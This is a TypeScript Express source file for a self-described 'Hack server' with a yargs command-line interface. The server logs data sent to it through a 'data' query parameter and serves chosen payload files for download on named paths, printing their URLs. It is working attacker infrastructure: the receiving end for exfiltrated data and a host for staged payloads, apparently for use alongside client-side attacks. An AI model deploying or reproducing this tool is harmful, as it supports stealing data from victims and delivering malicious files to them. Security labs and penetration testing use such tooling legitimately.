import express from 'express';
import yargs from 'yargs';
import getPayloadObject from './payload.mts'
import getNetworkInfo from './getNetworkInfo.mts'
import cors from 'cors';

const getUrl = (
  port: number,
  networkInfo: { [key: string]: { inet: string } },
  networkInterface: string | undefined
) => {
  const host = networkInterface
    ? networkInfo[networkInterface].inet
    : 'localhost'

  return `http://${host}:${port}`
}

type TStartServerArgs = {
  port: number
  networkInterface: string | undefined
  payload: string | string[] | Record<string, string> | unknown
}

const startServer = async ({
  port,
  networkInterface,
  payload,
}: TStartServerArgs) => {
  const payloadObj = payload && getPayloadObject(payload)

  const app = express()

  app.use(express.json())
  app.use(express.urlencoded({ extended: true }))
  app.use(cors())

  app.all('/', (req, res) => {
    const data = req.query.data && decodeURI(req.query.data as string)
    console.log(`\n${new Date().toLocaleString()} – ${req.method} - ${req.ip}`)
    console.log(data || "No 'data' query parameter given")
    res.sendStatus(200)
  })

  if (payloadObj) {
    Object.entries(payloadObj).forEach(([key, value]) => {
      app.get(`/${key}`, (req, res) => {
        console.log(
          `\n${new Date().toLocaleString()} – ${req.method} - ${req.ip}`
        )
        console.log(`${value} downloaded, url: ${req.url}`)
        res.sendFile(value)
      })
    })
  }

  app.listen(port, async () => {
    const url = getUrl(port, networkInfo, networkInterface)

    console.log(`Hack server started on port ${port} 😈`)
    if (networkInterface) {
      console.log(`Available in ${networkInterface} interface in ${url}`)
    } else {
      console.log(`Available in ${url}`)
    }
    if (payloadObj) {
      console.log(
        `Payloads: ${Object.entries(payloadObj)
          .map(([key, value]) => `\n\t${url}/${key}\t–\t${value}`)
          .join('')}`
      )
    }
  })
}

const networkInfo = await getNetworkInfo()

yargs(process.argv.slice(2))
  .command(
    '$0',
    'Starts a server to receive data from the hack',
    (yargs) =>
      yargs
        .option('networkInterface', {
          alias: 'n',
          type: 'string',
          description: 'The network interface to use',
          choices: Object.keys(networkInfo),
        })
        .option('port', {
          alias: 'p',
          type: 'number',
          description: 'Port to run the server in',
          default: 3000,
        })
        .option('payload', {
          alias: 'l',
          description: 'Payload file (array, object or string) to serve',
        }),
    async (args) => {
      await startServer(args)
    }
  )
  .parse()